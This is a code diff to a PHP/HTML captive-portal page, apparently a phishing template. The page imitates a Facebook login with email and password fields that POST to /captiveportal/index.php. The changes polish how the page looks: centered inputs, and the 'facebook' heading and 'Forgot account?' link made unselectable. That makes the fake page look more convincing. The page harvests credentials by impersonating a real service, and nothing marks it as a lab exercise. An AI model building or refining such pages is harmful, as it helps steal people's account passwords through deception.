@@ -98,7 +98,7 @@ require_once('helper.php');
 
       .login-form input[type="text"],
       .login-form input[type="password"] {
-      	display: inline-block;
+      	display: block;
         width: 345px;
         border: 1px solid #314d89;
         outline: none;
@@ -157,6 +157,15 @@ require_once('helper.php');
         padding-bottom: 7px;
         background: #C9C9C9;
       }
+
+      .disable-selection {
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      }
     </style>
   </head>
 
@@ -164,18 +173,18 @@ require_once('helper.php');
 
     <section class="login-form-wrap">
 
-      <h1>facebook</h1>
+      <h1 class="disable-selection">facebook</h1>
 
         <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
 
-            <label><input type="text" name="email" placeholder="Email or Phone" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
-            <label><input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
+            <center><label><input type="text" name="email" placeholder="Email or Phone" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
+            <label><input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required></label></center>
             <input type="hidden" name="target" value="<?=$destination?>">
             <input type="submit" value="Log In">
 
         </form>
 
-      <h5><a href="#">Forgot account?</a></h5>
+      <h5><a href="#" class="disable-selection">Forgot account?</a></h5>
 
     </section>
 
